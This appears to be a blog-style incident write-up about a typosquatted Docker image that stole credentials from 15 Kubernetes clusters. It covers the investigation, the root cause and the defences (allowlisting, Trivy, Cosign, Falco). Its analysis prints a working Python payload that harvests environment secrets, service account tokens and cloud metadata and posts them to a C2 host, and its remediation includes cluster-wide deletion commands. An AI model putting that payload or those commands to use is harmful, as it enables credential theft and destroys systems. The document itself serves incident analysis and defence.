---
title: "Supply Chain Attack — How a Malicious Container Image Compromised 15 Production Clusters"
date: 2026-06-01
weight: 100240
slug: "supply-chain-attack-malicious-image"
tags: ["kubernetes", "security", "supply-chain", "container", "troubleshooting"]
categories: ["Security"]
description: "A container supply chain attack incident — how a typosquatted Docker image on Docker Hub found its way into 15 Kubernetes clusters, exfiltrating environment variables and cluster credentials"
keywords: "container supply chain attack, malicious docker image, typosquatting docker, image security scanning, kubernetes image vulnerability"
draft: false
featured: true
cover:
  image: ""
  caption: "Supply Chain Attack — Malicious Image Incident"
---

# Supply Chain Attack — How a Malicious Container Image Compromised 15 Production Clusters

## Common Search Queries

- container supply chain attack example
- malicious docker image incident
- docker image typosquatting
- kubernetes image security scanning
- how to verify container image integrity

---

## The Incident

**Environment**: 15 Kubernetes clusters (dev/staging/prod across 3 cloud regions), 500+ microservices, multiple teams managing their own deployments.

**Time**: Wednesday 11:30 AM. Security team received an alert from their SIEM: unexpected outbound TLS connections from several containers to an unknown IP in Eastern Europe.

**Initial Symptoms**: Several freshly deployed pods were making HTTPS calls to `185.xxx.xxx.xxx:443` — an IP not associated with any known service the application depended on.

```bash
# Network flow log entry
Source: api-service-7d9f8c6b-x (10.244.3.15)
Destination: 185.xxx.xxx.xxx:443 (Unknown)
Traffic: 2.3 MB outbound (periodic every 5 minutes)
Process: /usr/bin/python3 /app/collect.py
```

**Impact**: Cluster credentials, database connection strings, and cloud provider metadata exfiltrated from 15 clusters over a 5-day period before discovery.

---

## Background

A popular open-source Redis client library for Python (`redis-utils`) had its Docker image published on Docker Hub. The legitimate library had thousands of stars and was widely used.

An attacker created a typosquatted package: `redus-utils` (note the missing 'i'). They published a Docker image `redus-utils/latest` on Docker Hub with a malicious layer that:

1. Scanned environment variables for `AWS_`, `AZURE_`, `GOOGLE_`, `KUBERNETES_`, `DB_`, `PASSWORD`
2. Collected `/var/run/secrets/kubernetes.io/serviceaccount/token`
3. Queried cloud metadata endpoints (169.254.169.254)
4. Exfiltrated everything to a C2 server via HTTPS every 5 minutes

The malicious image sat on Docker Hub for 3 months. During that time, several developers accidentally used it due to:
- Copy-pasting from unofficial blog tutorials that referenced the typosquatted name
- Typing errors in Dockerfiles (`redus-utils` instead of `redis-utils`)
- Auto-complete in CI/CD configs suggesting the malicious name

---

## Investigation

### Step 1: Identify the Malicious Image

```bash
# Check which image was used by the compromised pods
kubectl get pod api-service-7d9f8c6b-x -o json | jq -r '.spec.containers[].image'
# Output: docker.io/redus-utils/latest:1.2.3
```

The image name `redus-utils` was not a known internal image. It was published on Docker Hub by an external user.

### Step 2: Determine the Infection Vector

```bash
# Check which Kubernetes resources reference this image
for ns in $(kubectl get ns -o name); do
  kubectl get deployment,statefulset,daemonset -n $ns -o json 2>/dev/null | \
    jq -r '.items[] | select(.spec.template.spec.containers[].image | contains("redus-utils")) | "\($ns)/\(.metadata.name)"'
done
```

The image was used in 23 deployments across 15 clusters.

### Step 3: Trace the Imagesource

```bash
# Check image pull history across clusters
kubectl get events --all-namespaces | grep "redus-utils" | head -10
```

The first pull happened 5 days ago, in the development cluster. Over the next 5 days, the image propagated through CI/CD pipelines and Kubernetes deployments as developers copied the configuration.

### Step 4: Analyze the Malicious Behavior

```bash
# Check what data was exfiltrated
# (From a quarantined copy of the image)
docker history redus-utils:latest --no-trunc | grep -i "collect\|exfil\|upload\|curl"
```

The malicious layer added a Python script `/app/collect.py` that:

```python
# Pseudo-code of the malicious payload
import os, requests

# Collect environment variables
env_data = {k: v for k, v in os.environ.items() 
            if any(k.startswith(p) for p in ["AWS_", "DB_", "KUBERNETES_", "PASSWORD"])}

# Collect Kubernetes service account token
try:
    with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
        env_data["k8s_token"] = f.read()
except: pass

# Collect cloud metadata
try:
    r = requests.get("http://169.254.169.254/latest/meta-data/", timeout=2)
    env_data["cloud_metadata"] = r.text
except: pass

# Exfiltrate every 5 minutes
while True:
    requests.post("https://185.xxx.xxx.xxx/c2", json=env_data)
    time.sleep(300)
```

---

## Root Cause

1. **No image allowlisting**: Teams could pull any image from any registry without restriction
2. **No image scanning**: Docker Hub images were not scanned for vulnerabilities or malicious content before deployment
3. **No image policy enforcement**: No admission controller (like OPA/Gatekeeper) restricted which registries or images could be used
4. **Typosquatting awareness gap**: Developers weren't trained to verify image sources
5. **No Software Bill of Materials (SBOM)**: No tracking of what images and dependencies were in use across clusters
6. **Over-permissive service account tokens**: The mounted service account token had more permissions than necessary

---

## Resolution

### Emergency (Containment)

```bash
# 1. Block outbound traffic to the C2 server
kubectl run net-block --image=busybox -it --rm -- iptables -A OUTPUT -d 185.xxx.xxx.xxx -j DROP

# 2. Identify and delete all pods using the malicious image
kubectl get pods --all-namespaces -o json | jq -r '
  .items[] | select(.spec.containers[].image | contains("redus-utils")) |
  "\(.metadata.namespace) \(.metadata.name)"
' | while read ns pod; do
  kubectl delete pod -n $ns $pod
done

# 3. Block the image at admission level
# (Using OPA/Gatekeeper)
kubectl apply -f - <<EOF
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockRegistries
metadata:
  name: block-redus-utils
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
  parameters:
    deniedImages:
      - "redus-utils/*"
EOF
```

### Rotate All Compromised Credentials

```bash
# Rotate all service account tokens in affected namespaces
kubectl delete secret --all-namespaces -l kubernetes.io/service-account.name

# Restart all pods to force new tokens
kubectl delete pod --all-namespaces --all

# Rotate cloud provider credentials (AWS Access Keys, etc.)
# Rotate database passwords for all databases referenced in env vars
```

### Deploy Image Security Controls

1. **Image Allowlisting via OPA/Gatekeeper**:

```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRegistries
metadata:
  name: allow-internal-registries
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
  parameters:
    allowedRegistries:
      - "harbor.internal.company.com"
      - "gcr.io/company-project"
      - "docker.io/company-org"
```

2. **Image Scanning with Trivy**:

```bash
# Scan all images in CI/CD pipeline
trivy image --severity CRITICAL,HIGH gcr.io/company-project/api-service:latest

# Fail the build if critical vulnerabilities found
trivy image --exit-code 1 --severity CRITICAL gcr.io/company-project/api-service:latest
```

3. **Software Bill of Materials (SBOM)**:

```bash
# Generate SBOM for every image
trivy image --format cyclonedx -o sbom.json gcr.io/company-project/api-service:latest

# Store SBOM in a central registry
```

4. **Cosign for Image Signing and Verification**:

```bash
# Sign images in CI/CD
cosign sign --key cosign.key gcr.io/company-project/api-service:latest

# Verify before deployment
cosign verify --key cosign.pub gcr.io/company-project/api-service:latest
```

5. **Admission Controller for Image Verification**:

```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sSignedImages
metadata:
  name: require-cosign-signature
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
```

### Monitoring

```bash
# Alert on unexpected outbound connections from containers
# Falco rule: detect connections to unknown external IPs
- rule: Unexpected Outbound Connection
  desc: Detect containers connecting to unknown external IPs
  condition: outbound and not known_destination
  output: "Unexpected outbound connection (pod=%k8s.pod.name ip=%fd.sip)"
  priority: WARNING
```

---

## Lessons Learned

- **Docker Hub is the new npm/pypi for supply chain attacks**: Typosquatting works on container registries just as well as package managers. Verify every image source
- **Image scanning is not optional**: Every image must be scanned before deployment. This includes base images, not just application layers
- **Least privilege for service accounts**: The compromised token had more permissions than needed. Use dedicated service accounts with minimal RBAC
- **Allowlisting at admission**: Gatekeeper/OPA policies blocking unknown registries would have prevented this entirely
- **Monitor outbound traffic**: The exfiltration was active for 5 days before discovery. East-west and egress traffic monitoring catches data exfiltration
- **SBOM is essential for incident response**: Without knowing what images were in use, identifying all affected clusters takes days instead of hours

---

## Summary

The attack chain:

```
Attacker publishes typosquatted Docker image on Docker Hub (redus-utils)
→ Developer makes typo in Dockerfile or copies from untrusted blog
→ CI/CD builds and pushes image to registry
→ Kubernetes deploys pods with malicious image
→ collect.py script scans env vars, K8s token, cloud metadata
→ Exfiltrates data to C2 server every 5 minutes
→ 15 clusters compromised over 5 days
```

Discovery: SIEM alert flagged unusual outbound traffic. Remediation: 8 hours of credential rotation and policy deployment. Prevention: Image allowlisting + scanning + Cosign signing would have stopped this at every stage. Trust nothing, verify everything.
